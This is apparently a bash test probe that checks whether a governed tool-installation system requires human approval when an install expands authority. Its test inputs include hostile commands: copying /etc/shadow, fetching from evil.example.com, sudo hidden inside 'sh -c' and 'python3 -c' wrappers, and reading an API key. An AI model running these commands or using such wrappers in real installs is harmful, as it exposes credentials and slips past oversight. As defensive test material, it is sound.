#!/usr/bin/env bash
# Gamma held-out probe: F3 (missing-tool acquisition) and F4 (plugin/tool trust boundary) under owner
# decision OD-P2-03 (a tool installation gates only when it expands authority).
#
# What is asserted, from Contract v3 F3 (:414-423), F4 (:425-431) and OD-P2-03 requirements 1-7:
#   1. a non-elevated installation inside the authorised envelope closes with NO human gate  (OD-P2-03 req 6)
#   2. each authority-expansion trigger raises the human gate                                (OD-P2-03 req 7)
#   3. ordinary allowlisted network use alone does not gate                                  (OD-P2-03 "ordinary network use")
#   4. the OS derives the demand itself: an UNDER-DECLARING descriptor whose command escalates still gates
#   5. what the OS cannot read is gated (OD-P2-03 req 3, fail closed)
#   6. the governed security review is bound to the installation it authorises                (F4:431, BC-P2-41)
#   7. every installation is recorded with which branch applied and why                       (OD-P2-03 req 5)
. "$(dirname "$0")/lib.sh"

newproj f4gate --provision >/dev/null
RPT=$(security_review TL-JQ 1.7.1)
echo "governed security review: $RPT"
case "$RPT" in RPT-*) ok "F3/F4 setup: an independent governed security review exists ($RPT)";; *) bad "F3/F4 setup: no review record"; summary; exit 1;; esac

# one installation attempt -> "<installed> <gate> <branch> <expands> <triggers>"
try() { # try <name> <patch-json>
  descriptor "$LAB/d.yaml" "$RPT" "$2"
  GOV_SESSION=inst-$RANDOM g tooling-engineer tools install --descriptor "$LAB/d.yaml" \
  | python3 -c "
import sys,json
d=json.load(sys.stdin); r=d.get('result',d)
if not d.get('ok'):
    print('ERROR', d['error']['code']); raise SystemExit
cc=r.get('change_class',{}); e=cc.get('authority_envelope',{})
print(r.get('installed'), r.get('human_gate') or 'none', cc.get('branch'), e.get('expands_authority'),
      ','.join(e.get('triggers_fired') or []) or '-', len(e.get('undetermined') or []))"
}

read -r ins gate branch exp trig und <<< "$(try baseline '{}')"
check "$branch/$gate" "not_gated/none" "OD-P2-03 req 6: a non-elevated, reviewed, pinned, reversible install is NOT gated"
check "$ins" "True" "F3: the non-gated installation completes (install/configure/register/health/continue)"

# --- 2. every authority-expansion trigger gates -------------------------------------------------
expand() { # expand <label> <patch> <expected trigger>
  read -r ins gate branch exp trig und <<< "$(try "$1" "$2")"
  if [ "$branch" = "gated" ] && [ "$exp" = "True" ] && [ "$gate" != "none" ]; then
    case ",$trig," in *",$3,"*) ok "OD-P2-03 trigger '$3' gates: $1 (triggers $trig, gate $gate)";;
      *) bad "OD-P2-03 trigger '$3' expected for $1, got '$trig'";; esac
  else
    bad "OD-P2-03: $1 should gate as an authority expansion (branch=$branch expands=$exp gate=$gate triggers=$trig)"
  fi
}
expand "declares a permission class the role does not hold" '{"required_permission_classes":["READ_REPO","DB_WRITE"]}' privilege_escalation
expand "declares a host-authority class"                    '{"required_permission_classes":["READ_REPO","SYSTEM_INSTALL"]}' host_level_authority
expand "declares credential access"                         '{"required_permission_classes":["READ_REPO","SECRET_READ"]}' new_secret_or_credential_access
expand "installs with sudo"                                 '{"install_command":["sudo","cp","a","b"]}' privilege_escalation
expand "installs with a host package manager"               '{"install_command":["apt-get","install","-y","x"]}' host_level_authority
expand "installs globally"                                  '{"install_command":["npm","install","--global","x"]}' host_level_authority
expand "reaches outside the project"                        '{"install_command":["cp","/etc/shadow","./x"]}' broader_filesystem_or_project_access
expand "declares a policy mutation"                         '{"policy_overrides":{"AUTHORITY_POLICY":"x"}}' governance_or_security_policy_mutation
expand "fetches from an unallowlisted host"                 '{"install_command":["curl","-o","x","https://evil.example.com/x"]}' new_or_unrestricted_network_trust_boundary
expand "declares a credential scope"                        '{"credential_scope":"CI token"}' new_secret_or_credential_access
expand "reads a credential in its command"                  '{"install_command":["fetch","--API_KEY=$MY_API_KEY","x"]}' new_secret_or_credential_access

# --- 3. ordinary allowlisted network use alone does not gate (OD-P2-03) --------------------------
ALLOWED=$(gp orchestrator tools registry 2>/dev/null >/dev/null; python3 -c "
import yaml,sys
d=yaml.safe_load(open('$PROJ/governance/kernel/tools/registry/TOOLS.yaml'))
na=d.get('network_allowlist') or {}
h=(na.get('approved_registries') or [])+(na.get('allowlisted_services') or [])
print(h[0] if h else '')")
if [ -n "$ALLOWED" ]; then
  read -r ins gate branch exp trig und <<< "$(try allowlisted "{\"install_command\":[\"curl\",\"-o\",\"x\",\"https://$ALLOWED/pkg\"],\"required_permission_classes\":[\"READ_REPO\",\"NETWORK_READ\"]}")"
  check "$branch" "not_gated" "OD-P2-03: ordinary use of the approved registry $ALLOWED alone does not gate"
else
  bad "no network allowlist in the kernel tool registry to test ordinary network use against"
fi

# --- 4/5. the OS must derive the demand itself, and gate what it cannot read ---------------------
# The same escalations, wrapped in a shell/interpreter the descriptor declares nothing about.
hidden() { # hidden <label> <patch>
  read -r ins gate branch exp trig und <<< "$(try "$1" "$2")"
  if [ "$branch" = "gated" ]; then ok "OD-P2-03 req 3: $1 is gated (branch $branch, triggers $trig, undetermined $und)"
  else bad "OD-P2-03 req 3: $1 installed with NO human gate (branch=$branch expands=$exp triggers=$trig undetermined=$und)"; fi
}
hidden "an install command that runs sudo inside 'sh -c'"          '{"install_command":["sh","-c","sudo apt-get install -y x"]}'
hidden "an install command that copies /etc/shadow inside 'bash -lc'" '{"install_command":["bash","-lc","cp /etc/shadow ./x"]}'
hidden "an install command that runs os.system(sudo) in python3 -c" '{"install_command":["python3","-c","import os;os.system(\"sudo id\")"]}'
hidden "an install command that is an opaque build target"         '{"install_command":["make","install"]}'

# --- 6. the governed security review must be bound to the installation it authorises ------------
# The review above was written for TL-JQ 1.7.1 with the baseline command. Change what the tool
# actually does, keep id+version: a review of a different artefact must not authorise this one.
descriptor "$LAB/d.yaml" "$RPT" '{"install_command":["sh","-c","printf swapped > '"$LAB"'/REVIEW_NOT_BOUND.txt"]}'
out=$(GOV_SESSION=bind-$RANDOM g tooling-engineer tools install --descriptor "$LAB/d.yaml" --execute)
ins=$(printf '%s' "$out" | jget "r.get('installed')")
br=$(printf '%s' "$out" | jget "r.get('change_class',{}).get('branch')")
if [ -f "$LAB/REVIEW_NOT_BOUND.txt" ]; then
  bad "F4:431 / BC-P2-41: the review of TL-JQ 1.7.1 authorised a DIFFERENT installation (command swapped after review; branch=$br, executed outside any gate)"
else
  ok "F4:431: a review is bound to the installation it authorises (swapped command refused or gated; branch=$br installed=$ins)"
fi

# --- 7. the installation is recorded with the branch and why -------------------------------------
descriptor "$LAB/d.yaml" "$RPT" '{"tool_id":"TL-REC","install_command":["echo","rec"]}'
RPT2=$(security_review TL-REC 1.7.1)
descriptor "$LAB/d.yaml" "$RPT2" '{"tool_id":"TL-REC","install_command":["echo","rec"]}'
GOV_SESSION=rec-$RANDOM g tooling-engineer tools install --descriptor "$LAB/d.yaml" >/dev/null
rec=$(python3 -c "
import yaml,json,sys,os
p='$PROJ/governance/project/tools/TL-REC.yaml'
if not os.path.exists(p): print('MISSING'); raise SystemExit
d=yaml.safe_load(open(p)); a=d.get('approval',{}).get('authorised_by',{})
print('|'.join([str(a.get('owner_decision')),str(a.get('decision_record')),str(a.get('branch')),
  'why' if a.get('why') else '-', 'review' if a.get('security_review') else '-',
  'cit' if a.get('change_transaction') else '-']))")
case "$rec" in
  OD-P2-03\|D-0011\|not_gated\|why\|review\|cit) ok "OD-P2-03 req 4/5: the installed descriptor records decision, rule, branch, why, bound review and change transaction";;
  *) bad "OD-P2-03 req 4/5: installation record incomplete ($rec)";;
esac
summary
